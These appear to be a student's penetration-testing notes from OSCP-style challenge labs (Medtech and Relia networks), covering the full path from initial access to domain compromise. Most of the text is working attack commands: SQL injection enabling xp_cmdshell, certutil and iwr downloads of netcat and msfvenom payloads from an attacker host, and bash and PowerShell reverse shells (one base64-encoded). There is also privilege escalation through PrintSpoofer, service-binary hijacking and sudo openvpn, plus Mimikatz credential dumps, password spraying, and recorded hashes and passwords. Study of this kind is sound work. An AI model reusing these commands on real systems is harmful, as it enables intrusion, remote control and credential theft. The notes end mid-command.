# Challenge Labs

# Resources

IN windows Active Directory search for winpeas, C drive folders, permissions

```markdown
https://www.youtube.com/watch?v=DM1B8S80EvQ&t=1s
https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/
https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5
```

# Medtech

### Info

After exploiting .12

> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion - 192.168.177.120,122,14
DC01.medtech.com      Windows Server 2022 Standard 10.0 (20348) .10       12 -> ADMIN -> 120 ssh
FILES02.medtech.com   Windows Server 2022 Standard 10.0 (20348) .11     Admin
> 
> 
> [DEV04.medtech.com](http://dev04.medtech.com/)     Windows Server 2022 Standard 10.0 (20348) .12     Admin
> [PROD01.medtech.com](http://prod01.medtech.com/)    Windows Server 2022 Standard 10.0 (20348) .13           12 -> ADMIN
> .14
> [CLIENT01.medtech.com](http://client01.medtech.com/)  Windows 11 Enterprise        10.0 (22000) .82     Admin
> 
> [CLIENT02.medtech.com](http://client02.medtech.com/)  Windows 11 Enterprise        10.0 (22000) .83     Admin
> 
> Debain					.120    Admin
> [WEB02.dmz.medtech.com](http://web02.dmz.medtech.com/) Windows Server 2022 Standard 10.0 (20348) .121    Admin
> 
> .122    ssh()
> 

192.168.177.120 -22,80
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-title: PAW! (PWK Awesome Website)
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

192.168.177.120 -22,1149
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
1194/tcp open  openvpn?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

172.16.177.10

172.16.240.10 proof
offsec/century62hisan51

172.16.240.11 - proof
FILES02\Administrator- f1014ac49bae005ee3ece5f47547d185
FILES02\FILES02 - a68b2e0747fec7003ad613a77b0325b9
Administrator, Guest, joe, leon, mario, offsec, peach, wario

joe has log file - C:\Users\joe\Documents\fileMonitorBackup.log

172.16.240.12 local, proof
leon:$HEX[7261626269743a29]
leon:rabbit:) given in Mimicatz

172.16.240.13 proof

172.16.240.14

172.16.240.82 - proof
leon:rabbit!:)

172.16.240.83 - local, proof
192.168.240.120   -Admin  184
192.168.240.121 - proof.txt
Got access to shell through SQL Injection -> Msfvenom netcat -> printspoofer64.exe (SeImpersonatePrivilege)-Admin access -> Mimikatz (Got hashes) ->
medtech\joe - 08d7a47a6f9f66b97b1bae4178747494:Flowers1
medtech\web02 - ad022cdeb650cce9f806dfafa1978271
web02\Administrator - b2c03054c306ac8fc5f9d188710b0168

![Untitled](OSCP%20Videos%20Challenge%20Labs%203306187b1f27408096b6bf169fdf3f00/Untitled%2088.png)

kali>cat IPs
192.168.204.120, 192.168.204.121,192.168.204.122 (#Got Nmap Result)
172.16.204.10, 172.16.204.11, 172.16.204.12, 172.16.204.13, 172.16.204.14, 172.16.204.82, 172.16.204.83(# No Nmap Result)

```markdown
#sudo nmap -Pn -p- -T4 192.168.X.120-122 --reason -n -A
# Nmap 7.94SVN scan initiated Mon Apr  8 13:34:30 2024 as: nmap -A -T4 -p- -iL IPs -oA Nmap_Medtech
Host: 192.168.204.120 ()	Status: Up
Host: 192.168.204.120 ()	Ports: 22/open/tcp//ssh//OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)/, 80/open/tcp//http//WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))/	Ignored State: closed (65533)
Host: 192.168.204.121 ()	Status: Up
Host: 192.168.204.121 ()	Ports: 80/open/tcp//http//Microsoft IIS httpd 10.0/, 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 445/open/tcp//microsoft-ds?///, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 47001/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 49664/open/tcp//msrpc//Microsoft Windows RPC/, 49665/open/tcp//msrpc//Microsoft Windows RPC/, 49666/open/tcp//msrpc//Microsoft Windows RPC/, 49667/open/tcp//msrpc//Microsoft Windows RPC/, 49668/open/tcp//msrpc//Microsoft Windows RPC/, 49669/open/tcp//msrpc//Microsoft Windows RPC/, 49670/open/tcp//msrpc//Microsoft Windows RPC/, 49671/open/tcp//msrpc//Microsoft Windows RPC/	Ignored State: closed (65521)
Host: 192.168.204.122 ()	Status: Up
Host: 192.168.204.122 ()	Ports: 22/open/tcp//ssh//OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)/, 1194/open/tcp//openvpn?///	Ignored State: closed (65533)
# Nmap done at Mon Apr  8 13:36:45 2024 -- 10 IP addresses (3 hosts up) scanned in 134.81 seconds
```

### Medtech - 192.168.204.121

192.168.204.121

medtech\joe - 08d7a47a6f9f66b97b1bae4178747494-Flowers1

medtech\web02 - ad022cdeb650cce9f806dfafa1978271

web02\Administrator - b2c03054c306ac8fc5f9d188710b0168

```markdown
# Log in forn user username below one password as single character.
>';EXEC sp_configure 'show advanced options', 1;--
>';RECONFIGURE;--
>';EXEC sp_configure "xp_cmdshell", 1;--
>';RECONFIGURE;--
# Use the bellow data in Burpsuite
>';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.155:8000/nc.exe c:/windows/temp/nc.exe";--
# %27%3BEXEC%20xp_cmdshell%20%22certutil%20-urlcache%20-f%20http%3A%2F%2F192.168.45.242%3A8000%2Fnc.exe%20c%3A%2Fwindows%2Ftemp%2Fnc.exe%22%3B--
>';EXEC xp_cmdshell 'c:\windows\temp\nc.exe 192.168.45.155 4455 -e cmd.exe';--
# %27%3BEXEC%20xp_cmdshell%20%27c%3A%5Cwindows%5Ctemp%5Cnc.exe%20192.168.45.242%204455%20-e%20cmd.exe%27%3B--
#Got shell
>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4444 -f exe -o met4444.exe
>iwr -uri http://192.168.45.155:8000/met4444.exe -Outfile met4444.exe
>nc -nlvp 4444 
#Same shell
>whoami /priv (#SeImpersonatePrivilege-Impersonate a client after authentication-Enabled)
kali>wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
cmd>powershell
PS>iwr -uri http://192.168.45.155:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell.exe
>whoami (# Administrator)
>iwr -uri http://192.168.45.155:8000/file.exe -Outfile file.exe (# Mimikatz renamed)
>iwr -uri http://192.168.45.155:8000/SharpHound.exe -Outfile SharpHound.exe
```

![Untitled](OSCP%20Videos%20Challenge%20Labs%203306187b1f27408096b6bf169fdf3f00/Untitled%2089.png)

```markdown
Check SSH Connection:

ssh kali@192.168.45.155 - Working 
Ensure that this command works without issues.

Establish Reverse SSH Tunnel:

ssh -N -R 9998:localhost:9998 kali@192.168.45.155 -Working Put -N nothing is executing
Verify Tunnel is Active:
On your Kali machine, verify that the tunnel is active by checking the listening ports:

ss -ntpl | grep 9998 (Enabled the port in file - /etc/ssh/sshd_config)
-Port 22, 9998 are open 
-Confirmed in SS command

Check Firewall Rules: (iptables -L -v -n, enable port 9998)
Ensure that port 9998 is open on the Kali machine.
 pkts bytes target     prot opt in     out     source               destination         
    5   271 ACCEPT     6    --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:9998

Run ProxyChains: (tail /etc/proxychains4.conf)
socks5 127.0.0.1 9998

Confirm that the proxychains command is configured correctly and that you can reach the intended target:

proxychains -q impacket-psexec joe@172.16.178.11

└─$ proxychains -q impacket-psexec joe@172.16.178.11
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[-] [Errno Connection error (172.16.178.11:445)] [Errno 111] Connection refused

-------But Port 445 is listening
PS C:\Windows\system32> netstat -an | findstr ":445"
netstat -an | findstr ":445"
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    192.168.178.121:59527  192.168.45.155:4455    ESTABLISHED
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::1]:445              [::1]:51484            ESTABLISHED
  TCP    [::1]:51484            [::1]:445              ESTABLISHED
PS C:\Windows\system32> 

```

### Medtech - 172.16.185.11

```markdown
>sudo ip tuntap add user kali mode tun ligolo
>./Lproxy -selfcert (Mention Port below)
WIN_PS>.\Lagent -connect 192.168.45.204:11601 -ignore-cert
Ligilo>ifconfig (Network interfaces)
>sudo ip route add 172.16.201.0/24 dev ligolo (Run this if you for got run above "sudo ip link set dev ligolo up")
Ligilo>start
>ping 172.16.201.11 (You should able to reach before executing next command)
>impacket-psexec medtech/joe:Flowers1@172.16.201.11
##Got Windows Admin access,  
11>iwr -uri http://192.168.45.204:8000/winPEASx64.exe -Outfile winPEASx64.exe (Admini Desktop)
11>.\winPEASx64.exe
>iwr -uri http://192.168.45.204:8000/SharpHound.exe -Outfile SharpHound.exe
## Transfer files through Impacket-SMB, SSH scp command is not working on windows
>MATCH (m:Computer) RETURN m (Bloodhound)
>MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
>impacket-psexec medtech/joe:PASSWORD@172.16.201.10, 12, 13, 14, 82, 83 (try this without medtech/) 
>crackmapexec smb 172.16.185.82 -u users.txt  -p password.txt --continue-on-success (GOt pwned for yoshi/Mushroom!)
```

### Medtech - 172.16.185.82

```markdown
>impacket-psexec yoshi:'Mushroom!'@172.16.185.82
>C:\Users\offsec.CLIENT01\Desktop> type C:\Users\Administrator.MEDTECH\Searches\hole.txt
##leon:rabbit!:)
>impacket-psexec yoshi:'Mushroom!'@172.16.185.82
>C:\Users\offsec.CLIENT01\Desktop> type C:\Users\Administrator.MEDTECH\Searches\hole.txt
>type C:\Windows\debug\PASSWD.LOG
>iwr -uri http://192.168.45.189:8000/met4444.exe -Outfile met4444.exe
>iwr -uri http://192.168.45.189:8000/PowerView.ps1 -Outfile PowerView.ps1
>powershell -ep bypass
>Import-Module .\PowerView.ps1
>Find-LocalAdminAccess (DEV04.medtech.com)
>.\PsLoggedOn64.exe \\DC01
>.\PsLoggedOn64.exe \\FILES02
>iwr -uri http://192.168.45.189:8000/PsLoggedon64.exe -Outfile PsLoggedon64.exe
```

### Medtech - 172.16.185.83

```markdown

>evil-winrm -i 172.16.185.83 -u wario -p 'Mushroom!'

#RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)

>icacls C:\DevelopmentExecutables\auditTracker.exe (Full access Found in winPEAS)
>iwr -uri http://192.168.45.204:8000/adduser.exe -Outfile adduser.exe (Not worked)
>move C:\DevelopmentExecutables\auditTracker.exe adduser.exe
>move .\adduser.exe C:\DevelopmentExecutables\auditTracker.exe
>sc.exe start audittracker
>runas /user:dave2 cmd (Automatically closing)
>iwr -uri http://192.168.45.204:8000/file.exe -Outfile file.exe (# Mimikatz renamed)

>evil-winrm -i 172.16.185.83 -u wario -p 'Password123!'
>$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
>$credential = New-Object System.Management.Automation.PSCredential("dave2", $password)
>Start-Process cmd.exe 
#error
Get-ChildItem -Path C:\ -Filter *.log -Recurse

## Deleting the file
>cd C:\DevelopmentExecutables
>Remove-Item auditTracker.exe
>dir (File Deleted)
>iwr -uri http://192.168.45.204:8000/met4444.exe -Outfile met4444.exe
>move C:\DevelopmentExecutables\auditTracker.exe met4444.exe
>sc.exe start audittracker (Before running this command, Started Netcat another shell)
#Got shell

>iwr -uri http://192.168.45.189:8000/PowerView.ps1 -Outfile PowerView.ps1
>powershell -ep bypass
>Import-Module .\PowerView.ps1
>Find-LocalAdminAccess (DEV04.medtech.com)
>.\PsLoggedOn64.exe \\DC01
>.\PsLoggedOn64.exe \\FILES02
>iwr -uri http://192.168.45.189:8000/PsLoggedon64.exe -Outfile PsLoggedon64.exe
>iwr -uri http://192.168.45.189:8000/PsLoggedon.exe -Outfile PsLoggedon.exe

>Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion - 192.168.177.120,122,13,14,10
DC01.medtech.com      Windows Server 2022 Standard 10.0 (20348) .10    
FILES02.medtech.com   Windows Server 2022 Standard 10.0 (20348) .11     Admin  
DEV04.medtech.com     Windows Server 2022 Standard 10.0 (20348) .12     Admin 
CLIENT01.medtech.com  Windows 11 Enterprise        10.0 (22000) .82     Admin    
PROD01.medtech.com    Windows Server 2022 Standard 10.0 (20348) .13       
CLIENT02.medtech.com  Windows 11 Enterprise        10.0 (22000) .83     Admin    
WEB02.dmz.medtech.com Windows Server 2022 Standard 10.0 (20348) .121    Admin
```

### Medtech -  172.16.201.12

Windows search .txt ,.log, files 

**Get-ChildItem -Path C:\ -Filter *.log -Recurse**

In windows creds if you have the credentials try crackmapexec rdp or winrm, xfreerdp

```markdown
172.16.201.12

>crackmapexec smb 172.16.244.10 -u users.txt -p password.txt --continue-on-success
>crackmapexec rdp 172.16.244.10 -u users.txt -p password.txt --continue-on-success
##Sprying the passwords with smb, rdp not worked 
xfreerdp rdp screen resolution /smart-sizing
>xfreerdp /u:yoshi /p:'Mushroom!' /d:medtech /v:172.16.201.12 /smart-sizing:1920x1080
>.\winpEASx64.exe (Reveled C:\TEMP\backup.exe file with modify permission)
## C:\TEMP\backup.exe file with modify permission
##Rename backup.exe to backupA.exe
>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f exe -o met4444.exe
>iwr -uri http://192.168.45.204:8000/met4444.exe -Outfile met4444.exe
##Copyied msfvenom payload 
##modify the name backup.exe
>sc.exe start backup
>nc -nlvp 4444
#Got Admin Access
>.\mimicatz.exe
## leon:$HEX[7261626269743a29]
> .\winPEASx64.exe
## Added password in the password.txt
>crackmapexec smb 172.16.244.10 -u users.txt -p password.txt --continue-on-success

##History
crackmapexec smb 172.16.201.10 -u users.txt -p password.txt --continue-on-success
 2082  crackmapexec smb 172.16.244.10 -u users.txt -p password.txt --continue-on-success
 2084  crackmapexec smb 172.16.244.13 -u users.txt -p password.txt --continue-on-success
 2085  crackmapexec smb 172.16.244.14 -u users.txt -p password.txt --continue-on-success
 2086  impacket-psexec leon:'$HEX[7261626269743a29]'@172.16.244.14
 2087  impacket-psexec leon:'$HEX[7261626269743a29]'@192.168.244.120
 2088  impacket-psexec leon:'$HEX[7261626269743a29]'@192.168.244.122
 2089  crackmapexec rdp 172.16.244.14 -u users.txt -p password.txt --continue-on-success
 2090  impacket-psexec leon:"$HEX[7261626269743a29]"@192.168.244.122
 2092  crackmapexec rdp 172.16.244.10 -u users.txt -p password.txt --continue-on-success
 2093  nmap 172.16.244.10 -Pn
 2094  smbclient -L \\\\172.16.244.10 -u leon -p "$HEX[7261626269743a29]"
 2095  xfreerdp /u:leon /p:"$HEX[7261626269743a29]" /d:medtech /v:172.16.244.10\n
 2097  ping 172.16.244.10
 2098  smbclient -L \\\\172.16.244.10 -u leon -p '$HEX[7261626269743a29]'
 2099  smbclient -L \\\\172.16.244.10 -U leon -P '$HEX[7261626269743a29]'
 2100  locate /var/lib/samba/private/secrets.tdb
 2101  locate secrets.tdb
 2102  smbclient -L \\172.16.244.10 -U leon -P '$HEX[7261626269743a29]'
 2103  smbclient  \\172.16.244.10\ -U leon -P '$HEX[7261626269743a29]'
 2104  cls
 2105  xfreerdp /u:leon /p:'$HEX[7261626269743a29]' /d:medtech /v:172.16.244.10\n
 2106  xfreerdp /u:leon /p:'$HEX[7261626269743a29]'  /v:172.16.244.10\n
 2107  impacket-psexec leon:'$HEX[7261626269743a29]'@172.16.244.10

```

n medtech, I got admin access .12, I don't have any hints move forward, tried SharpHound, but unable to transfer files using ssh&scp, smb. I'm i doing correct way.
##Hint -- We can see what user is currently loggedin via PsLoggedOn64.exe from sysinternals tool (We could have utilize this earlier) on any other machine that we had local admin access.

## >Find-LocalAdminAccess available in PowerView.ps1

> iwr -uri http://192.168.45.189:8000/PowerView.ps1 -Outfile PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
Find-LocalAdminAccess (DEV04.medtech.com)
.\PsLoggedOn64.exe \\DC01
.\PsLoggedOn64.exe \\FILES02
iwr -uri http://192.168.45.189:8000/PsLoggedon64.exe -Outfile PsLoggedon64.exe
iwr -uri http://192.168.45.189:8000/PsLoggedon.exe -Outfile PsLoggedon.exe
##No use with Powerview, noinformation with PsLoggedon
> 

> hydra -L users.txt -P password.txt 192.168.177.120 ssh
#No use tried 120,122, 10,13,14
##Hint -- I suggest dumping AD users and the creds from .12 and spraying those to the internal network.
crackmapexec smb 172.16.177.10 -u users.txt -p password.txt --continue-on-success #pwned creds --- leon:rabbit:)
> 
> 
> impacket-psexec leon:'rabbit:)'@172.16.177.11
> ##Bad user name and password changed to double codes
> impacket-psexec leon:"rabbit:)"@172.16.177.11
> #Already exploited with joe user
> 
> > crackmapexec smb 172.16.177.14 -u users.txt -p password.txt --continue-on-success #pwned creds --- leon:rabbit:)
> > 
> > 
> > impacket-psexec leon:"rabbit:)"@172.16.177.13
> > 

172.16.177.13

> iwr -uri http://192.168.45.189:8000/met4444.exe -Outfile met4444.exe
iwr -uri http://192.168.45.189:8000/file.exe -Outfile file.exe (# Mimikatz renamed)
iwr -uri http://192.168.45.189:8000/winPEASx64.exe -Outfile winPEASx64.exe
> 

With Mimicatz no user creds, winPEAS still running

### Medtech - 172.16.177.10

```jsx
>crackmapexec smb 172.16.177.10 -u users.txt -p password.txt --continue-on-success #pwned creds --- leon:rabbit:)  
>impacket-psexec leon:"rabbit:)"@172.16.177.10
>PS C:\Users\Administrator\Desktop> cat credentials.txt
## web01: offsec/century62hisan51
>iwr -uri http://192.168.45.189:8000/met4444.exe -Outfile met4444.exe
>iwr -uri http://192.168.45.189:8000/file.exe -Outfile file.exe (# Mimikatz renamed)
>iwr -uri http://192.168.45.189:8000/winPEASx64.exe -Outfile winPEASx64.exe
## Mimicatz - medtech/ADMINISTrator:denZV00Zwtpax57.
```

```jsx
>hydra -L users.txt -P password.txt 192.168.177.120 ssh (Added passoword - century62hisan51,denZV00Zwtpax57.)
#[22][ssh] host: 192.168.177.120   login: offsec   password: century62hisan51

192.168.177.120 - Previously identified 120,122 has ssh port open.
>ssh offsec@192.168.184.120 (#password - century62hisan51)
#offsec@WEB01:/home$ sudo -l
#   (ALL) NOPASSWD: ALL
#   (ALL : ALL) NOPASSWD: ALL
>sudo su
>wget http://192.168.45.189:8000/linpeas.sh
>ls -l
#No Execute permission
>chmod +x linpeas.sh
>./linpeas.sh
# Reveals Linpeas
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                         
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

#Netcat NC port scan
## scan 1 to 1023 ports ##
nc -zv vip-1.vsnl.nixcraft.in 1-1023
## Password file saw in offsec discord 500-worst-passwords.txt
>hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt 192.168.184.122 ssh
>ssh offsec@192.168.184.122
#Limited assess with shell, Got local.txt
User offsec may run the following commands on vpn:
    (ALL : ALL) /usr/sbin/openvpn
#Gitfobins
>sudo /usr/sbin/openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
## Not worked
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/
>echo "#!/bin/bash\nbash -i >& /dev/tcp/192.168.45.189 4444 0>&1" > file.sh
#Offsec hints
>history
>sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
#Got root shell
>find /path/to/directory -type f -name "*.txt"
>sudo find / -type f -name "*.txt"
#Geting full tty shell
>python3 -c 'import pty; pty.spawn("/bin/bash")'
#worded got full tty shell

>wget http://192.168.45.189:8000/linpeas.sh
>chmod +x linpeas.sh

#found  /home/mario/.ssh/id_rsa

##Passwords
passwd file: /etc/pam.d/passwd                                                                                                                                        
passwd file: /etc/passwd
passwd file: /snap/core20/1405/etc/pam.d/passwd
passwd file: /snap/core20/1405/etc/passwd
passwd file: /snap/core20/1405/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1405/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1405/var/lib/extrausers/passwd
passwd file: /snap/core20/1623/etc/pam.d/passwd
passwd file: /snap/core20/1623/etc/passwd
passwd file: /snap/core20/1623/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1623/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1623/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
##Passwords

From

>ssh -i /home/mario/.ssh/id_rsa mario@172.16.184.14
#No proper shell
>python3 -c 'import pty; pty.spawn("/bin/bash")'

#SUID
mario@NTP:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/fusermount

>cat id_rsa | base64

```

# Relia

![image.png](OSCP%20Videos%20Challenge%20Labs%203306187b1f27408096b6bf169fdf3f00/image%201.png)

### Relia -192.168.204.250 - winPREP for config.Library-ms

```jsx
192.168.204.250 (offsec / lab), Given credentials in Lab.
Powershell
>whoami
#Windows domain joined or nor
>systeminfo | findstr /B "Domain" (# Work group - Domain not joined)
> iwr -uri http://192.168.45.166:8000/winPEASx64.exe -Outfile winPEASx64.exe
>.\winPEASx64.exe
#I don't like interface tried in NetCat get the shell in KaliLinux
> iwr -uri http://192.168.45.166:8000/nc.exe -Outfile nc.exe
>nc.exe 192.168.45.166 4455 -e cmd.exe
#Search for id_rsa file
>Get-ChildItem -Path C:\ -Recurse -Filter "id_rsa" -ErrorAction SilentlyContinue

```

### Relia - 192.168.204.247 - Umbraco 7.12.4, Database.kdbx, kpcli

```jsx
192.168.204.247
>ftp 192.168.204.247 -p 14020
#Has FTP anonymous login in that their is a PDF has creds (mark:OathDeeplyReprieve91) 

>crackmapexec smb 192.168.204.191 -u mark -p "OathDeeplyReprieve91" --continue-on-success
> crackmapexec smb 192.168.204.189-250 -u offsec -p "lab" --continue-on-success
#Tried smb, rdp
>hydra -L users.txt -P pass.txt -M ip.txt mysql 
>hydra -L users.txt -P pass.txt -M ip.txt rdp  (# revealed 250 it's given by offsec)
#Tried FTP, SSH, mysql

After some tries seek for help
#Hint - The credentials can be used to log on to the web application, If you haven't discovered the port then I suggest taking a step back and performing a full port scan to identify the correct port for these credentials.

80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
14020/tcp open  ftp           FileZilla ftpd
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

 https://www.exploit-db.com/exploits/50406 error as bad request,
 >./50406.sh targets.txt /etc/passwd (IP address in the target)
 #Hint - maybe u need to read back the PDF, there is another important information aside from the credentials
>./50406.sh targets.txt /etc/passwd (web02.relia.com in the target)
#Hint - That is not intended, you can use the web application name and version number to search for the exploit.
I search this “Umbraco 7” found 3, one is metasploit, other 2 is aspx first one 49488, second 46153.

IN the search PoC identified “umbraco cms 7.12.4 exploit”  https://github.com/noraj/Umbraco-RCE
>python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com -c ipconfig (#Error)
>python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c ipconfig  (#Working)

#in https://www.revshells.com/ in Powershell #1
$LHOST = "192.168.45.166"; $LPORT = 6666; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
#Use base64 encode don't change integrity

python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c "powershell -env JExIT1NUID0gIjE5Mi4xNjguNDUuMTY2IjsgJExQT1JUID0gNjY2NjsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ=="
#Error 
python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c powershell.exe -a" -e 